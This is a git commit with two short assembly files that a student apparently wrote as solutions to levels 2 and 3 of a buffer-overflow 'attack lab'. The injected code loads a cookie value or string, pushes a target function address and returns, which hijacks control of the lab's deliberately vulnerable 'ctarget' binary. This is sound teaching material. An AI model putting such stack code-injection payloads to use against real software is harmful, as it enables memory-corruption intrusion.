f7f79ec1265e80f9b8533707c2f2b9b31e16c316
xgb <978601499@qq.com>
2022-10-09 23:04:19 +0800

    attack_lab ctarget lavel 1 ~ 3

---
+++ attack_lab/target1/ctarget.2.attack_code.s
@@ -0,0 +1,4 @@
+movq $0x59b997fa, %rdi
+subq $0x8,%rsp 
+movq $0x00000000004017ec, (%rsp)
+retq
---
+++ attack_lab/target1/ctarget.3.attack_code.s
@@ -0,0 +1,8 @@
+movq $0x5561dc78, %rsp
+movq $0x6166373939623935, %rdx
+movq %rdx, (%rsp)
+movq $0,8(%rsp)
+movq $0x5561dc78, %rdi
+subq $8, %rsp
+movq $0x00000000004018fa, (%rsp)
+retq
